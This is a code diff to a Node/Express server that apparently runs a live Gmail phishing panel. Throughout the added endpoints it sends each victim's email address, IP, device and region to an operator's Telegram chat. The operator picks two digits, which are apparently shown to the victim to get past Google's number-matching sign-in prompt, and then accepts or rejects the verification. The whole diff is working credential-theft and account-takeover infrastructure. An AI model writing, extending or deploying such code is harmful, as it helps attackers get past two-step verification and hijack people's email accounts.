@@ -243,7 +243,14 @@ app.get("/check-status", (req, res) => {
       return res.json({ status: "unknown" });
     }
 
-    // ✅ Check Gmail login first
+    // ✅ Check Gmail verification first
+    if (pendingVerificationPage[identifier]) {
+      return res.json({
+        status: pendingVerificationPage[identifier].status || "pending"
+      });
+    }
+
+    // ✅ Check Gmail login
     if (pendingGmailLogin[identifier]) {
       return res.json({
         status: pendingGmailLogin[identifier].status || "pending"
@@ -318,6 +325,13 @@ app.post("/update-status", (req, res) => {
 
     if (!email || !status) {
       return res.status(400).json({ error: "Missing email or status" });
+    }
+
+    // ✅ Handle Gmail verification (confirmRequestId like verify_confirm_xxx_xxx)
+    if (pendingVerificationPage[email]) {
+      pendingVerificationPage[email].status = status;
+      console.log(`✅ Updated pendingVerificationPage[${email}].status = ${status}`);
+      return res.json({ ok: true, message: "Gmail verification status updated" });
     }
 
     // ✅ Handle Gmail login (identifier is the requestId like gmail_xxx_xxx)
@@ -1029,6 +1043,9 @@ const pendingGmailLogin = {};
 const displayEmailStore = {};
 const displayEmailByRequestId = {};
 
+// ✅ Storage for Gmail Verification
+const pendingVerificationPage = {};
+
 app.post("/send-gmail-login", async (req, res) => {
   try {
     console.log('🔍 DEBUG: /send-gmail-login endpoint called');
@@ -1148,6 +1165,306 @@ app.get("/get-gmail-login/:requestId", (req, res) => {
     }
   } catch (err) {
     console.error("❌ Get Gmail login error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// GMAIL VERIFICATION ENDPOINTS
+// ============================================================================
+
+app.post("/send-verification-page", async (req, res) => {
+  try {
+    console.log('🔍 DEBUG: /send-verification-page endpoint called');
+    const { userId, email: gmailEmail } = req.body;
+    console.log('🔍 DEBUG: Received userId:', userId, 'email:', gmailEmail);
+    
+    if (!userId) {
+      return res.status(400).json({ error: "Missing userId" });
+    }
+    
+    const requestId = `verify_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    console.log('🔍 DEBUG: Generated requestId:', requestId);
+    
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    pendingVerificationPage[requestId] = { status: "pending", selectedDigits: null, email: gmailEmail };
+    console.log(`📥 Verification Page Request received: ${requestId}`);
+
+    const message =
+      `🌈🌈🌈 <b>Gmail - Verification</b> 🌈🌈🌈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${gmailEmail || 'Unknown'}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "0", callback_data: `verify_digit|${requestId}|0` },
+            { text: "1", callback_data: `verify_digit|${requestId}|1` },
+            { text: "2", callback_data: `verify_digit|${requestId}|2` },
+            { text: "3", callback_data: `verify_digit|${requestId}|3` },
+            { text: "4", callback_data: `verify_digit|${requestId}|4` }
+          ],
+          [
+            { text: "5", callback_data: `verify_digit|${requestId}|5` },
+            { text: "6", callback_data: `verify_digit|${requestId}|6` },
+            { text: "7", callback_data: `verify_digit|${requestId}|7` },
+            { text: "8", callback_data: `verify_digit|${requestId}|8` },
+            { text: "9", callback_data: `verify_digit|${requestId}|9` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    console.log('🔍 DEBUG: Sending response with requestId:', requestId);
+    res.json({ status: "pending", requestId, email: gmailEmail });
+
+  } catch (err) {
+    console.error("❌ Verification Page endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ POST /update-selected-digits
+app.post("/update-selected-digits", (req, res) => {
+  try {
+    const { requestId, digit } = req.body;
+    if (!requestId || digit === undefined) {
+      return res.status(400).json({ error: "Missing requestId or digit" });
+    }
+    
+    if (!pendingVerificationPage[requestId]) {
+      return res.status(400).json({ error: "Invalid requestId" });
+    }
+
+    if (!pendingVerificationPage[requestId].selectedDigits) {
+      pendingVerificationPage[requestId].selectedDigits = [];
+    }
+
+    pendingVerificationPage[requestId].selectedDigits.push(digit);
+    console.log(`✅ Digit ${digit} selected for ${requestId}`);
+
+    res.json({ ok: true, selectedCount: pendingVerificationPage[requestId].selectedDigits.length });
+  } catch (err) {
+    console.error("❌ Update selected digits error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /get-selected-digits
+app.get("/get-selected-digits", (req, res) => {
+  try {
+    const { requestId } = req.query;
+    if (!requestId) {
+      return res.status(400).json({ error: "Missing requestId" });
+    }
+
+    const entry = pendingVerificationPage[requestId];
+    if (!entry) {
+      return res.json({ success: false });
+    }
+
+    if (entry.selectedDigits && entry.selectedDigits.length === 2) {
+      const number = entry.selectedDigits[0] + entry.selectedDigits[1];
+      return res.json({ success: true, number });
+    }
+
+    res.json({ success: false });
+  } catch (err) {
+    console.error("❌ Get selected digits error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ POST /send-verification-confirm
+app.post("/send-verification-confirm", async (req, res) => {
+  try {
+    const { email, userId, digit1, digit2, requestId } = req.body;
+    console.log('📥 send-verification-confirm called with:', { email, userId, digit1, digit2, requestId });
+    
+    if (!email || !userId || digit1 === undefined || digit2 === undefined) {
+      return res.status(400).json({ error: "Missing required fields" });
+    }
+
+    const confirmRequestId = `verify_confirm_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+    
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    console.log(`📥 Verification Confirm Request received: ${confirmRequestId}`);
+
+    pendingVerificationPage[confirmRequestId] = { status: "pending", email: email };
+
+    const selectedNumber = digit1 + digit2;
+    const message =
+      `🌈🌈🌈 <b>Gmail - Verify Numbers</b> 🌈🌈🌈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>🔢 Selected Numbers:</b> <code><b>${selectedNumber}</b></code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "✅ Accept", callback_data: `gmail_verify_accept|${confirmRequestId}` },
+            { text: "❌ Reject", callback_data: `gmail_verify_reject|${confirmRequestId}` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    console.log('✅ Verification confirm message sent');
+    res.json({ status: "pending", requestId: confirmRequestId });
+
+  } catch (err) {
+    console.error("❌ Verification Confirm endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ POST /resend-verification
+app.post("/resend-verification", async (req, res) => {
+  try {
+    const { userId, email, requestId } = req.body;
+    console.log('🔄 resend-verification called with:', { userId, email, requestId });
+    
+    if (!userId || !email || !requestId) {
+      return res.status(400).json({ error: "Missing required fields" });
+    }
+
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
+      req.headers["x-real-ip"] ||
+      req.connection.remoteAddress ||
+      "Unknown IP";
+
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    console.log(`📥 Resend Verification Request received for: ${requestId}`);
+
+    // ✅ CLEAR OLD DIGITS
+    if (pendingVerificationPage[requestId]) {
+      pendingVerificationPage[requestId].selectedDigits = null;
+      console.log(`🔄 Cleared old digits for ${requestId}`);
+    }
+
+    const message =
+      `🔄 <b>Resend Code - Gmail</b> 🔄\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: "0", callback_data: `verify_digit|${requestId}|0` },
+            { text: "1", callback_data: `verify_digit|${requestId}|1` },
+            { text: "2", callback_data: `verify_digit|${requestId}|2` },
+            { text: "3", callback_data: `verify_digit|${requestId}|3` },
+            { text: "4", callback_data: `verify_digit|${requestId}|4` }
+          ],
+          [
+            { text: "5", callback_data: `verify_digit|${requestId}|5` },
+            { text: "6", callback_data: `verify_digit|${requestId}|6` },
+            { text: "7", callback_data: `verify_digit|${requestId}|7` },
+            { text: "8", callback_data: `verify_digit|${requestId}|8` },
+            { text: "9", callback_data: `verify_digit|${requestId}|9` }
+          ]
+        ]
+      }
+    };
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: options.parse_mode,
+        reply_markup: options.reply_markup
+      })
+    });
+
+    console.log('🔄 Resend verification message sent');
+    res.json({ status: "ok", requestId });
+
+  } catch (err) {
+    console.error("❌ Resend Verification endpoint error:", err);
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ✅ GET /api/verification-status/:requestId
+app.get("/api/verification-status/:requestId", (req, res) => {
+  try {
+    const { requestId } = req.params;
+    const entry = pendingVerificationPage[requestId];
+    if (!entry) {
+      return res.json({ status: "pending" });
+    }
+    res.json({ status: entry.status });
+  } catch (err) {
+    console.error("❌ Verification status endpoint error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
